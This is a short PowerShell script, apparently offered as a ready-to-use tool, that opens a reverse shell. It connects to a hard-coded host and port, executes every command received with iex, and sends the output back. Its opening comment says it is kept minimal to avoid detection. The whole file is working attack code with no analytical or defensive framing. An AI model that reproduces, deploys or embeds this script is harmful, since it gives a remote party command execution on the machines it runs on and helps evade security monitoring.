# A simple reverse shell script. No fancy features, no AMSI bypass. I made it as simple as possible to avoid detection.
$ip = '172.16.133.1'
$port = 4443

$c = New-Object System.Net.Sockets.TCPClient($ip, $port)
$s = $c.GetStream()
$w = New-Object System.IO.StreamWriter($s, [System.Text.Encoding]::UTF8)
$r = New-Object System.IO.StreamReader($s)
$w.AutoFlush = $true

function _psexec($cmd) {
    try {
        return iex $cmd 2>&1 | Out-String
    } catch {
        return $_.Exception.Message
    }
}

while ($c.Connected) {
    $prompt = "[$pid] PS $pwd > "
    $w.Write($prompt)
    $cmd = $r.ReadLine()
    if ($cmd -eq 'exit') { break }
    $result = _psexec($cmd)
    $w.WriteLine($result)
}

$w.Close()
$r.Close()
$c.Close()